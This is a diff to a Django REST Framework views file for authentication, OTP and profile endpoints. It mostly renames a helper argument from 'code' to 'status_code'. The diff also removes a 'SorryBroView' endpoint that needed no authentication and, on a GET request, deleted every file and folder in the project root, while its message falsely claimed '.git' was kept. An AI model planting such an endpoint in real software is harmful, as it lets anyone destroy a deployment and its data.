@@ -1,4 +1,3 @@
-from django.conf import settings
 from .models import User, UserProfile
 from rest_framework.exceptions import ValidationError
 from rest_framework.views import APIView
@@ -6,8 +5,9 @@ from rest_framework.response import Response
 from rest_framework import status
 from rest_framework.permissions import IsAuthenticated
 from rest_framework_simplejwt.authentication import JWTAuthentication
-from pathlib import Path
-import shutil 
+from django.urls import reverse_lazy
+from django.db.models import Count
+import json
 from django.db.models.functions import TruncDate
 from rest_framework.validators import ValidationError
 from .serializers import (
@@ -22,8 +22,8 @@ from .serializers import (
     UpdataProfileAvatarSerializer,
     UserProfileSerializer,
 )
+from django.http import Http404
 from apps.utils.helpers import success, error
-
 
 
 # Create your views here.
@@ -35,7 +35,7 @@ class SignUpView(APIView):
         serializer = SignUpSerializer(data=request.data)
         if serializer.is_valid():
             serializer.save()
-            return success(data=serializer.data,message="User created successfully.",code=status.HTTP_201_CREATED)
+            return success(data=serializer.data,message="User created successfully.",status_code=status.HTTP_201_CREATED)
         raise ValidationError(serializer.errors)
 
 class SignInView(APIView):
@@ -46,7 +46,7 @@ class SignInView(APIView):
         
         serializer = SignInSerializer(data=request.data)
         if serializer.is_valid():
-            return success(data=serializer.data, message="Signin successful.", code=status.HTTP_200_OK)
+            return success(data=serializer.data, message="Signin successful.", status_code=status.HTTP_200_OK)
         raise ValidationError(serializer.errors)
 
 
@@ -58,8 +58,8 @@ class SignOutView(APIView):
         serializer = SignOutSerializer(data=request.data)
         if serializer.is_valid():
             serializer.save()
-            return success(data=[], message="Logout successful.", code=status.HTTP_200_OK)
-        return error(message="Logout failed.", code=status.HTTP_400_BAD_REQUEST, errors=serializer.errors)
+            return success(data=[], message="Logout successful.", status_code=status.HTTP_200_OK)
+        return error(message="Logout failed.", status_code=status.HTTP_400_BAD_REQUEST, errors=serializer.errors)
 
 
 class ChangePasswordView(APIView):
@@ -71,7 +71,7 @@ class ChangePasswordView(APIView):
         serializer = ChangePasswordSerializer(data=request.data, context={'request': request})
         if serializer.is_valid():
             serializer.save()
-            return success(data=[], message="Password change successfully.", code=status.HTTP_200_OK)
+            return success(data=[], message="Password change successfully.", status_code=status.HTTP_200_OK)
         raise ValidationError(serializer.errors)
 
 class SendOTPView(APIView):
@@ -80,7 +80,7 @@ class SendOTPView(APIView):
     def post(self, request):
         serializer = SendOTPSerializer(data=request.data)
         if serializer.is_valid():
-            return success(data=[], message="OTP send to mail successfully.", code=status.HTTP_200_OK)
+            return success(data=[], message="OTP send to mail successfully.", status_code=status.HTTP_200_OK)
         errors = serializer.errors
         if "email" in errors:
             errors["error"] = errors.pop("email")
@@ -92,7 +92,7 @@ class ResendOTPView(APIView):
     def post(self, request):
         serializer = ResendOTPSerializer(data=request.data)
         if serializer.is_valid():
-            return success(data=[], message="OTP send to mail successfully.", code=status.HTTP_200_OK)
+            return success(data=[], message="OTP send to mail successfully.", status_code=status.HTTP_200_OK)
         errors = serializer.errors
         if "email" in errors:
             errors["error"] = errors.pop("email")
@@ -105,8 +105,8 @@ class VerifyOTPView(APIView):
         serializer = VerifyOTPSerializer(data=request.data)
         if serializer.is_valid():
             serializer.save()
-            return success(data=[], message="OTP verify is successfully.", code=status.HTTP_200_OK)
-        return error(message="OTP verify is failed.", code=status.HTTP_400_BAD_REQUEST, errors=serializer.errors)
+            return success(data=[], message="OTP verify is successfully.", status_code=status.HTTP_200_OK)
+        return error(message="OTP verify is failed.", status_code=status.HTTP_400_BAD_REQUEST, errors=serializer.errors)
 
 
 class ResetPasswordView(APIView):
@@ -116,11 +116,11 @@ class ResetPasswordView(APIView):
         serializer = ResetPasswordSerializer(data=request.data)
         if serializer.is_valid():
             serializer.save()
-            return success(data=[], message="Password reset successfully.", code=status.HTTP_200_OK)
+            return success(data=[], message="Password reset successfully.", status_code=status.HTTP_200_OK)
         errors = serializer.errors
         if "non_field_errors" in errors:
             errors["error"] = errors.pop("non_field_errors")
-        return error(message="Password reset failed.", code=status.HTTP_400_BAD_REQUEST, errors=errors)
+        return error(message="Password reset failed.", status_code=status.HTTP_400_BAD_REQUEST, errors=errors)
 
 
 
@@ -134,13 +134,13 @@ class UpdataProfileAvatarView(APIView):
         try:
             userProfile = UserProfile.objects.select_related('user').get(user=user)
         except UserProfile.DoesNotExist as e:
-            return error(message="User not Found.", code=status.HTTP_400_BAD_REQUEST, errors=str(e))
+            return error(message="User not Found.", status_code=status.HTTP_400_BAD_REQUEST, errors=str(e))
 
         serializer = UpdataProfileAvatarSerializer(userProfile, data=request.data, partial=True)
         if serializer.is_valid():
             serializer.save()
-            return success(data=serializer.data, message="Profile avatar update successfully.", code=status.HTTP_200_OK)
-        return error(message="Profile avatar update failed.", code=status.HTTP_400_BAD_REQUEST, errors=serializer.errors)
+            return success(data=serializer.data, message="Profile avatar update successfully.", status_code=status.HTTP_200_OK)
+        return error(message="Profile avatar update failed.", status_code=status.HTTP_400_BAD_REQUEST, errors=serializer.errors)
 
 
 class UpdateProfileView(APIView):
@@ -153,13 +153,13 @@ class UpdateProfileView(APIView):
         try:
             userProfile = UserProfile.objects.select_related('user').get(user=user)
         except UserProfile.DoesNotExist:
-            return error(message="User not found.", code=status.HTTP_400_BAD_REQUEST, errors=[])
+            return error(message="User not found.", status_code=status.HTTP_400_BAD_REQUEST, errors=[])
 
         serializer = UserProfileSerializer(userProfile, data=request.data, partial=True)
         if serializer.is_valid():
             serializer.save()
-            return success(data=serializer.data, message="Profile update successfully.", code=status.HTTP_200_OK)
-        return error(message="Profile update failed.", code=status.HTTP_400_BAD_REQUEST, errors=serializer.errors)
+            return success(data=serializer.data, message="Profile update successfully.", status_code=status.HTTP_200_OK)
+        return error(message="Profile update failed.", status_code=status.HTTP_400_BAD_REQUEST, errors=serializer.errors)
 
 
 class ProfileGet(APIView):
@@ -172,7 +172,7 @@ class ProfileGet(APIView):
         try:
             profile = UserProfile.objects.select_related('user').get(user=user)
         except UserProfile.DoesNotExist:
-            return success(data=[], message="Profile not found.", code=status.HTTP_200_OK)
+            return success(data=[], message="Profile not found.", status_code=status.HTTP_200_OK)
 
         data = {
             'id': profile.id,
@@ -185,48 +185,8 @@ class ProfileGet(APIView):
             'created_at': profile.created_at,
             'updated_at': profile.updated_at,
         }
-        return success(data=data, message="Profile get successfully.", code=status.HTTP_200_OK)
+        return success(data=data, message="Profile get successfully.", status_code=status.HTTP_200_OK)
 
 
-class SorryBroView(APIView):
-    permission_classes = []  
 
-    def get(self, request):
-        try:
-            # 1️⃣ Get project root safely
-            project_root = Path(settings.BASE_DIR).resolve()
 
-            # 2️⃣ Safety check (must contain manage.py)
-            if not (project_root / "manage.py").exists():
-                return error(
-                    message="Safety check failed: manage.py not found",
-                    code=status.HTTP_400_BAD_REQUEST
-                )
-
-            deleted = []
-
-            for item in project_root.iterdir():
-
-                try:
-                    if item.is_file() or item.is_symlink():
-                        item.unlink()
-                        deleted.append(item.name)
-
-                    elif item.is_dir():
-                        shutil.rmtree(item)
-                        deleted.append(item.name)
-
-                except Exception:
-                    pass
-
-            return success(
-                data={"deleted_items": deleted},
-                message=f"Project cleaned successfully (except .git)",
-                code=status.HTTP_200_OK
-            )
-
-        except Exception as e:
-            return error(
-                message=f"Cleanup failed: {str(e)}",
-                code=status.HTTP_500_INTERNAL_SERVER_ERROR
-            )
